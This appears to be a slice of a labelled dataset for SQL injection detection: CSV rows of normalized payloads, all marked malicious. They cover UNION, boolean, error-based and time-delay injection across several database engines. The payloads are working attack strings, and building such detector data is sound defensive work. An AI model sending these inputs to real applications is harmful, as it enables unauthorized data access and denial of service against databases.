row_index,payload_norm,label,sqli_type_hint
1410,1'|| ( select 'omeg' from dual where 4751 = 4751,1,
1411,"1"" ) ) ) or 8466 = benchmark ( 5000000,md5 ( 0x694a4745 ) ) and ( ( ( ""ijag"" = ""ijag",1,
1412,"-2314%' ) ) union all select 4612,4612--",1,
1413,1%' and 7533 = 7533 and '%' = ',1,
1414,"1',extractvalue ( 9788,concat ( 0x5c,0x7171706a71, ( select ( elt ( 9788 = 9788,1 ) ) ) ,0x717a767a71 ) )",1,
1415,"1' ) as eymt where 3911 = 3911 or 4411 = ( select count ( * ) from sysusers as sys1,sysusers as sys2,sysusers as sys3,sysusers as sys4,sysusers as sys5,sysusers as sys6,sysusers as sys7 ) --",1,
1416,"1' ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
1417,"1' ) where 8211 = 8211 union all select null,null,null,null,null#",1,
1418,"-1083' ) union all select 9993,9993,9993,9993,9993,9993,9993,9993,9993--",1,
1419,"-6561"" ) ) ) or 6872 = 6872 and ( ( ( ""azqp"" like ""azqp",1,
1420,"1%"" ) ) ) and 3707 = ( select count ( * ) from sysibm.systables as t1,sysibm.systables as t2,sysibm.systables as t3 ) and ( ( ( ""%"" = """,1,
1421,"1 ) ) as kycl where 8008 = 8008 or 8384 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
1422,"1' ) ) ) and elt ( 9041 = 6421,6421 ) and ( ( ( 'ixxg' like 'ixxg",1,
1423,"1 ) as attr where 8085 = 8085 and 9254 = ( select count ( * ) from rdb$fields as t1,rdb$types as t2,rdb$collations as t3,rdb$functions as t4 ) --",1,
1424,"1"" where 2035 = 2035 and 3824 = benchmark ( 5000000,md5 ( 0x76555642 ) ) --",1,
1425,"-5891 union all select 7103,7103,7103,7103--",1,
1426,"1' ) or ( select 2* ( if ( ( select * from ( select concat ( 0x7171706a71, ( select ( elt ( 8113 = 8113,1 ) ) ) ,0x717a767a71,0x78 ) ) s ) , 8446744073709551610, 8446744073709551610 ) ) ) and ( 'xgzb' = 'xgzb",1,
1427,"1' ) ) ) and 8148 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) --",1,
1428,1' ) ) as mbzk where 9153 = 9153 and 2006 = 2006,1,
1429,"1"" ) ) ) or 8514 = benchmark ( 5000000,md5 ( 0x544d5a4c ) ) #",1,
1430,1'+ ( select 'hcqf' where 9956 = 9956 and ( 2993 = 4297 ) *4297 ) +',1,
1431,1'|| ( select 'gved' from dual where 6965 = 6965,1,
1432,-8963 ) where 8528 = 8528 or ( 2470 = 3271 ) *3271--,1,
1433,"1' or ( select 9173 from ( select count ( * ) ,concat ( 0x7171706a71, ( select ( elt ( 9173 = 9173,1 ) ) ) ,0x717a767a71,floor ( rand ( 0 ) *2 ) ) x from information_schema.character_sets group by x ) a ) and 'scye' like 'scye",1,
1434,"1"" ) ) as kmss where 3214 = 3214 and char ( 109 ) ||char ( 79 ) ||char ( 70 ) ||char ( 90 ) = regexp_substring ( repeat ( right ( char ( 5012 ) ,0 ) ,5000000000 ) ,null ) --",1,
1435,"1"" ) or updatexml ( 1808,concat ( 0x2e,0x7171706a71, ( select ( elt ( 1808 = 1808,1 ) ) ) ,0x717a767a71 ) ,8666 ) and ( ""igop"" = ""igop",1,
1436,"1'+ ( select afst where 7454 = 7454 and 3202 = like ( 'abcdefg',upper ( hex ( randomblob ( 500000000/2 ) ) ) ) ) +'",1,
1437,"1 ) procedure analyse ( extractvalue ( 9255,concat ( 0x5c, ( benchmark ( 5000000,md5 ( 0x52515a50 ) ) ) ) ) ,1 )",1,
1438,"1 where 5929 = 5929 or 5286 = ( select count ( * ) from all_users t1,all_users t2,all_users t3,all_users t4,all_users t5 ) --",1,
1439,"-5575"" union all select 8665,8665,8665,8665,8665,8665,8665--",1,
